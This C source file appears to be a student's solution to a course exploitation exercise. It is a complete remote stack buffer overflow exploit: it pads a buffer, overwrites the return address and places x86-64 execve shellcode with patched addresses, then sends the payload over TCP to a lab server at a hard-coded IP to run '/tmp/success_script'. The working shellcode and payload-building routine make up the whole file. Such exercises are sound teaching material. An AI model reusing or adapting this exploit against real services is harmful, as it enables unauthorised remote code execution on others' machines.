#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <arpa/inet.h>

#define SCRIPT_PATH "/tmp/success_script"
#define SCRIPT_PATH_LEN 20
#define PAYLOAD_MAX_SIZE 1024
#define STUDENT_ID "208494443"
#define STUDENT_ID_LEN 10
#define QWORD_S 8
#define MOVABS_LEN 2

unsigned char shell_bin[] = {
  0x48, 0xbf, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0xbe,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x31, 0xd2, 0x48,
  0xc7, 0xc0, 0x3b, 0x00, 0x00, 0x00, 0x0f, 0x05, 0x48, 0xc7, 0xc0, 0x3c,
  0x00, 0x00, 0x00, 0x48, 0xc7, 0xc7, 0x01, 0x00, 0x00, 0x00, 0x0f, 0x05
};
size_t shell_len = 48;

static void write_u64_le(unsigned char *b, uint64_t v){
    for(int i=0;i<8;i++){ b[i] = (unsigned char)(v & 0xff); v >>= 8; }
}

int main(int argc, char **argv){
    if (argc < 3){
        fprintf(stderr, "Usage: %s <buffer_address> <offset>\n", argv[0]);
        return 1;
    }

    size_t offset = (size_t)atoi(argv[2]);           // printed offset (decimal)

    // calculate address to use in the payload
    uint64_t ret_addr = (uint64_t)(strtoull(argv[1], NULL, 0) + offset + QWORD_S); // where we want execution to jump
    size_t script_path_addr = ret_addr + shell_len; // after the shellcode
    size_t id_addr = script_path_addr + SCRIPT_PATH_LEN; // after the script path
    size_t argv_addr = id_addr + STUDENT_ID_LEN; // after the student ID

    // malloc the payload
    unsigned char *payload = malloc(PAYLOAD_MAX_SIZE);
    if (!payload) return 1;

    /* ------------------------------------------------------------------------------------------
     payload pattern: PAD | new_return_addr | shellcode | script_path | ID | argv (script_addr, id, null)
     --------------------------------------------------------------------------------------------*/

    size_t off = 0;
    // pad the payload up to the offset
    memset(payload + off, 0x41, offset);
    off += offset;

    // insert the new return address
    write_u64_le(payload +off, ret_addr);
    off += QWORD_S;

    // insert the shellcode
    memcpy(payload + off, shell_bin, shell_len);
    //inserting the addresses into the shellcode
    *(unsigned long long *)(payload + off + MOVABS_LEN) = script_path_addr;
    *(unsigned long long *)(payload + off + MOVABS_LEN + QWORD_S + MOVABS_LEN) = argv_addr;
    off += shell_len;

    // script path
    memcpy(payload + off, SCRIPT_PATH, SCRIPT_PATH_LEN);
    off += SCRIPT_PATH_LEN;
    // student ID
    memcpy(payload + off, STUDENT_ID, STUDENT_ID_LEN);
    off += STUDENT_ID_LEN;
    
    // fill the argv array
    *(unsigned long long *)(payload + off) = script_path_addr;
    off += QWORD_S;
    *(unsigned long long *)(payload + off) = id_addr;
    off += QWORD_S;
    *(unsigned long long *)(payload + off) = 0;
    
    // get total payload length
    size_t payload_len = off + QWORD_S;
    

    // create the socket and connect to the server
    int sock_fd;
    struct sockaddr_in server_addr;

    // assign IP, PORT
    server_addr.sin_family = AF_INET;
    server_addr.sin_addr.s_addr = inet_addr("192.168.1.202");
    server_addr.sin_port = htons(12345);

    /* Create socket */
    sock_fd = socket(AF_INET, SOCK_STREAM, 0);
    if (sock_fd < 0) {
        exit(1);
    }

    // connect
    int _connect = connect(sock_fd, (struct sockaddr *)&server_addr, sizeof(server_addr));
    if (_connect < 0) {
        exit(1);
    }

    // send the payload
    ssize_t bytes_sent = send(sock_fd, payload, (size_t)payload_len, 0);
    if (bytes_sent == -1) {
        perror("send");
        exit(1);
    } else if ((size_t)bytes_sent != payload_len) {
        printf("Partial send: %zd of %zu bytes\n", bytes_sent, payload_len);
        exit(1);
    }

    // clean up
    close(sock_fd);
    free(payload);
    return 0;
}
